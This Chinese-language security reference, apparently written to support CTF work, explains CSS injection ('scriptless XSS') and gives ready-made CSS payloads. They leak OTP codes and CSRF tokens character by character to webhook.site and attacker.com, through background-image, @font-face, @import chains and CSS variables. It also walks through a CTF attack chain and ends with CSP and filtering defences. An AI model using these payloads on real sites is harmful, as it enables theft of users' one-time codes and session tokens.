# CSS 注入与 Scriptless XSS — 高级数据外带技术

**CWE 参考**: CWE-79 (XSS), CWE-692 (不完整黑名单)
**关联 CVE**: CVE-2023-23924, CVE-2018-5175
**平均 CVSS**: 7.5 (高危)

## 概述

Scriptless XSS（也称 CSS 注入 / CSS 数据外带）是一种即使 CSP 阻止了 JavaScript 执行，也能通过 CSS
窃取页面敏感数据的高级攻击技术。攻击者利用 CSS 属性选择器匹配特定 DOM 元素的属性值，通过
`background-image` / `@font-face` 等加载外部资源的 CSS 属性将匹配到的数据逐字符外带到攻击者
控制的服务器。

## 攻击前提

1. **HTML 注入点**: 页面存在未过滤的用户输入注入（如 `ad`、`q`、`callback` 参数反射到页面中）
2. **CSP 未限制 style-src**: CSP 允许内联样式（`style-src 'unsafe-inline'`）或未限制 `style-src`
   来源，或允许从任意域加载图片（`img-src *`）
3. **可匹配的敏感数据**: 页面 DOM 中存在包含敏感值的属性（如 `<input value="OTP_CODE">`、
   CSRF token 在 `<input name="csrf" value="...">`、或 `<a href="/reset?token=...">`）

## CSS 属性选择器基础

| 选择器 | 含义 | 示例 |
|---|---|---|
| `[attr^="val"]` | 属性值以 "val" 开头 | `input[value^="a"]` |
| `[attr$="val"]` | 属性值以 "val" 结尾 | `input[value$="z"]` |
| `[attr*="val"]` | 属性值包含 "val" | `input[value*="admin"]` |
| `[attr="val"]` | 属性值完全等于 "val" | `input[value="123456"]` |

## 核心攻击 Payload：逐字符外带

当目标是一个 6 位数字 OTP 输入框时：

```css
input[value^="0"] { background-image: url(https://webhook.site/YOUR-ID?c=0); }
input[value^="1"] { background-image: url(https://webhook.site/YOUR-ID?c=1); }
input[value^="2"] { background-image: url(https://webhook.site/YOUR-ID?c=2); }
input[value^="3"] { background-image: url(https://webhook.site/YOUR-ID?c=3); }
input[value^="4"] { background-image: url(https://webhook.site/YOUR-ID?c=4); }
input[value^="5"] { background-image: url(https://webhook.site/YOUR-ID?c=5); }
input[value^="6"] { background-image: url(https://webhook.site/YOUR-ID?c=6); }
input[value^="7"] { background-image: url(https://webhook.site/YOUR-ID?c=7); }
input[value^="8"] { background-image: url(https://webhook.site/YOUR-ID?c=8); }
input[value^="9"] { background-image: url(https://webhook.site/YOUR-ID?c=9); }
```

**原理**: 当用户输入 OTP 第一位为 "3" 时，`input[value^="3"]` 选择器匹配，浏览器发起
`GET https://webhook.site/YOUR-ID?c=3` 请求，攻击者从 webhook 日志得到第一位。

### 多字符位置外带（两轮扫描）

**第一轮** — 确定第一位：
```css
input[value^="a"] { background: url(//attacker.com/?p1=a); }
input[value^="b"] { background: url(//attacker.com/?p1=b); }
/* ... 对每个可能字符重复 ... */
```

**第二轮** — 确定前两位（基于第一轮结果，假设第一位是 "3"）：
```css
input[value^="3a"] { background: url(//attacker.com/?p2=a); }
input[value^="3b"] { background: url(//attacker.com/?p2=b); }
/* ... */
```

### 完整自动化 Payload 模板

对 N 位字母数字混合的 OTP/Token，每轮都需要注入新的 `<style>` 标签。在实际攻击中
通常使用 `<style>` 标签包裹上述 CSS，而非内联 `style=""` 属性（后者不能使用
`background-image` 等需加载外部资源的属性）。

典型注入 `<style>` 标签的方式：
```html
<style>
  input[value^="a"]{background:url(https://attacker.com/?c=a)}
  input[value^="b"]{background:url(https://attacker.com/?c=b)}
  /* ... 逐字符覆盖完整字符集 ... */
</style>
```

## @import 链式加载

当单次注入有长度限制时，可以通过 `@import` 分阶段加载：

```html
<style>@import url(https://attacker.com/poll?len=0)</style>
```

服务端在确认未收到数据时返回空的 CSS，然后在检测到第一位泄露后动态返回下一轮 payload：
```css
/* poll?len=0 返回（第一轮） */
input[value^="0"] { background: url(//attacker.com/?p1=0); }
/* ... */
/* poll?len=1 返回（第二轮，已知第一位后） */
input[value^="00"] { background: url(//attacker.com/?p2=0); }
/* ... */
```

## 常见外带通道

| CSS 属性 | 触发条件 | 限制 |
|---|---|---|
| `background-image: url(...)` | 选择器匹配即触发 | 需 `img-src` 未限制或允许外部 |
| `@font-face { src: url(...) }` | 字体应用到任何元素 | 需 `font-src` 未限制 |
| `list-style-image: url(...)` | 列表项存在 | 需 `img-src` 未限制 |
| `cursor: url(...)` | 鼠标悬停 | 需用户交互 |
| `border-image: url(...)` | 元素渲染 | 需 `img-src` 未限制 |

最常用的是 `background-image`，因为它在选择器匹配时自动触发，无需用户交互。

## 字符集选择

外带效率取决于目标值的字符集大小：

| 场景 | 字符集 | 每轮 payload 数 | 示例 |
|---|---|---|---|
| 纯数字 OTP (6位) | `0-9` | 10 | 银行验证码 |
| 十六进制 CSRF Token | `0-9a-f` | 16 | CSRF 防护令牌 |
| 字母数字混合 | `0-9a-zA-Z` | 62 | API Key |
| ASCII 可打印字符 | `\x20-\x7e` | 95 | 通用 Token |

如果知悉目标值的格式（如已知为 hex），可以大幅缩小字符集以加速外带。

## 增强技巧

### 1. 连字消除（Ligature-based）
利用连字（如 `input[value*="flag"]`）一次性检测已知子串，减少外带轮数。

### 2. 字体裁剪
```html
<style>
@font-face { font-family: x; src: url(//attacker.com/?a), local(Arial); }
input { font-family: x; }
</style>
```

### 3. CSS 变量 + 选择器嵌套
```css
:root { --x: url(//attacker.com/leak); }
input[value^="X"] { --x: url(//attacker.com/leak?c=X); }
div { background: var(--x); }
```

### 4. 失效字体回退外带
利用浏览器对不同字体的回退行为，逐个字符判断是否匹配特定字形。

## 完整攻击链（CTF 实战）

以典型 CTF 场景为例：

```
目标: http://ctf.example.com:8080
├── / → 首页，ad 参数存在 HTML 注入，触发 Scriptless XSS
├── /visit → 提交 URL 让 admin bot 访问（模拟 XSS bot）
└── /flag → 需要提交 admin 的 OTP 验证码获取 flag
```

**攻击步骤**：

1. **侦察注入点**：访问 `/?ad=test`，查看页面源码确认 `test` 被原样嵌入且无过滤
2. **确认 CSP**：`analyze_headers` 检查 CSP 响应头 → 发现 `script-src` 限制了 JS 但 `style-src` 允许内联
3. **识别敏感数据**：页面中存在 `<input id="otp" value="..." maxlength="6">` 且 value 由 admin bot 自动填充
4. **设置 webhook**：获取 webhook.site 的接收 URL（如 `https://webhook.site/abc123`）
5. **构造 CSS payload**：使用 `css_exfil_payload` 工具生成逐位外带的 CSS
6. **提交给 bot**：通过 `/visit` 接口让 admin bot 访问带 CSS payload 的注入 URL
7. **收集外带数据**：从 webhook 日志中按 `?c=X` 参数逐个还原 OTP 字符
8. **还原完整 OTP**：使用 `webhook_reconstruct` 工具解析日志，得到完整 OTP
9. **获取 flag**：将完整 OTP 提交到 `/flag` 接口

## 防御方案

### 严格 CSP 配置
```
Content-Security-Policy: style-src 'self'; img-src 'self'; font-src 'self';
```
**关键**: 不使用 `'unsafe-inline'`，`img-src` / `font-src` 不开放通配符。

### 服务端过滤
- 过滤 HTML 标签和 `<style>` 标签
- 如果必须允许样式，对 `url()` 和 `@import` 做白名单过滤
- 过滤用户输入中的 CSS 特殊字符：`{}[]*^$=` 和 `url(`

### HTML 编码
```python
# ✅ 对所有用户输入做 HTML 实体编码
from html import escape
safe_output = escape(user_input)
# <style> → &lt;style&gt;
```

### 敏感值保护
- 验证码/OTP 输入框使用 `type="password"`（但属性选择器仍可匹配 `value` 属性）
- 不在 `value` 属性中预填敏感数据
- CSRF token 使用自定义 HTTP Header 而非隐藏表单字段（CSS 无法读取 Header）
- 使用 `autocomplete="off"` 防止浏览器缓存

## 与其他攻击的组合

| 组合 | 说明 |
|---|---|
| CSS + CRLF Injection | 通过 CRLF 在响应头中注入 `Link` 头加载外部 CSS |
| CSS + DOM Clobbering | 用 DOM Clobbering 创建 HTML 元素供 CSS 选择器匹配 |
| CSS + Clickjacking | 结合透明 iframe 在用户不知情时触发数据外带 |
| CSS + SVG Injection | SVG 内部可使用 `<foreignObject>` 嵌入 HTML/CSS |
| CSS + 开放重定向 | 如果 `url()` 被限制为同源，可利用开放重定向中转请求 |

## 参考资料

- [PortSwigger — Blind CSS Exfiltration](https://portswigger.net/research/blind-css-exfiltration)
- [OWASP — Testing for CSS Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection)
- [CSS Exfil Protection — Same-Origin via CSS](https://www.ndss-symposium.org/ndss-paper/same-origin-via-css-exfiltration-evil-sheets-beyond/)
